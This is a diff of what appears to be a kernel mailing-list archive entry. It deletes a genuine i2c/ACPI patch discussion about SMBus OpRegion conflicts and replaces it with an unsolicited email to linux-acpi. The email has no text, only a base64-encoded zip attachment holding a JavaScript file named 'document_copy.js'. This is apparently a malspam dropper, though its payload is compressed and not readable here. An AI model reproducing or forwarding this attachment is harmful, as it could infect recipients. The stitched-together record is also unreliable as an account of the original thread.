@@ -1,80 +1,67 @@
-From: Mika Westerberg <mika.westerberg@linux.intel.com>
-Subject: Re: [PATCH v2] i2c: i801: Allow ACPI SystemIO OpRegion to conflict
- with PCI BAR
-Date: Wed, 4 May 2016 12:40:38 +0300
-Message-ID: <20160504094038.GS1717@lahna.fi.intel.com>
-References: <1462354045-94455-1-git-send-email-mika.westerberg@linux.intel.com>
+From: <kchristopher@framingham.edu>
+Subject: linux-acpi
+Date: Tue, 04 May 2016 18:30:50 0000
+Message-ID: <000101d1a633$156ecc12$c0a80001@bisv.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=iso-8859-1
-Content-Transfer-Encoding: QUOTED-PRINTABLE
-Return-path: <linux-i2c-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <1462354045-94455-1-git-send-email-mika.westerberg@linux.intel.com>
-Sender: linux-i2c-owner@vger.kernel.org
-To: Jean Delvare <jdelvare@suse.com>, Wolfram Sang <wsa@the-dreams.de>
-Cc: Jarkko Nikula <jarkko.nikula@linux.intel.com>, "Rafael J. Wysocki" <rjw@rjwysocki.net>, Andy Lutomirski <luto@kernel.org>, Mario Limonciello <mario_limonciello@dell.com>, pali.rohar@gmail.com, linux-i2c@vger.kernel.org, linux-acpi@vger.kernel.org
+Content-Type: application/zip; name="linux-acpi.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-acpi-owner@vger.kernel.org>
+Received: from host-109-235-186-195.bisv.ru ([109.235.186.195]:48932 "HELO
+	bisv.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+	id S1751321AbcEDMa4 (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+	Wed, 4 May 2016 08:30:56 -0400
+Content-Disposition: attachment
+Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
+To: linux-acpi <linux-acpi@vger.kernel.org>
 
-On Wed, May 04, 2016 at 12:27:25PM +0300, Mika Westerberg wrote:
-> Many Intel systems the BIOS declares a SystemIO OpRegion below the SM=
-Bus
-> PCI device as can be seen in ACPI DSDT table from Lenovo Yoga 900:
->=20
->   Device (SBUS)
->   {
->       OperationRegion (SMBI, SystemIO, (SBAR << 0x05), 0x10)
->       Field (SMBI, ByteAcc, NoLock, Preserve)
->       {
->           HSTS,   8,
->           Offset (0x02),
->           HCON,   8,
->           HCOM,   8,
->           TXSA,   8,
->           DAT0,   8,
->           DAT1,   8,
->           HBDR,   8,
->           PECR,   8,
->           RXSA,   8,
->           SDAT,   16
->       }
->=20
-> There are also bunch of AML methods that that the BIOS can use to acc=
-ess
-> these fields. Most of the systems in question AML methods accessing t=
-he
-> SMBI OpRegion are never used.
->=20
-> Now, because of this SMBI OpRegion many systems fail to load the SMBu=
-s
-> driver with an error looking like one below:
->=20
->   ACPI Warning: SystemIO range 0x0000000000003040-0x000000000000305F
->        conflicts with OpRegion 0x0000000000003040-0x000000000000304F
->        (\_SB.PCI0.SBUS.SMBI) (20160108/utaddress-255)
->   ACPI: If an ACPI driver is available for this device, you should us=
-e
->        it instead of the native driver
->=20
-> The reason is that this SMBI OpRegion conflicts with the PCI BAR used=
- by
-> the SMBus driver.
->=20
-> It turns out that we can install a custom SystemIO address space hand=
-ler
-> for the SMBus device to intercept all accesses through that OpRegion.=
- This
-> allows us to share the PCI BAR with the AML code if it for some reaso=
-n is
-> using it. We do not expect that this OpRegion handler will ever be ca=
-lled
-> but if it is we print a warning and prevent all access from the SMBus
-> driver itself.
->=20
-> Suggested-by: Rafael J. Wysocki <rafael.j.wysocki@intel.com>
-> Signed-off-by: Mika Westerberg <mika.westerberg@linux.intel.com>
 
-=46orgot to add link to the bugzilla entry and reporters:
 
-Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=3D110041
-Reported-by: Andy Lutomirski <luto@kernel.org>
-Reported-by: Pali Roh=E1r <pali.rohar@gmail.com>
+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
